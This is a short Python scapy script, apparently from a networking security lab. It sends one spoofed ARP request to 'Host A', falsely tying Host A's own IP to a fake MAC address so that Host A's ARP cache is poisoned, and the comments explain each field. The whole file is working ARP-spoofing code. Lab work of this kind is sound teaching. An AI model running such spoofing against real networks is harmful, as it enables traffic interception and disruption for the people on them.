#!/usr/bin/env python3
from scapy.all import *

# Correct IP for Host M (attacker)
IP_M = "10.9.0.105" # Corrected IP for Host M (hostC)
MAC_M_REAL = "02:42:0a:09:00:69" # Actual MAC of Host M

VICTIM_IP = "10.9.0.5" # Host A's IP
MAC_A = "02:42:0a:09:00:05" # Host A's MAC

FAKE_MAC = "aa:bb:cc:dd:ee:ff" # The MAC you want to inject

print("Sending spoofed ARP request to Host A...")

# Modify the Ethernet destination to target Host A
# Option 1: Unicast to Host A
ether = Ether(src=FAKE_MAC, dst=MAC_A)
# Option 2: Broadcast (more common for requests that intend to update caches)
# ether = Ether(src=FAKE_MAC, dst="ff:ff:ff:ff:ff:ff")


# Your ARP payload logic:
# This creates an ARP request FOR IP_M (10.9.0.105),
# claiming that VICTIM_IP (10.9.0.5, which is Host A itself)
# is at FAKE_MAC.
arp = ARP()
arp.psrc = VICTIM_IP
arp.hwsrc = FAKE_MAC
arp.pdst = IP_M # ARP payload asks "Who has IP_M?"
arp.op = 1      # ARP Request

frame = ether/arp
sendp(frame)

print("Sent 1 packet.")
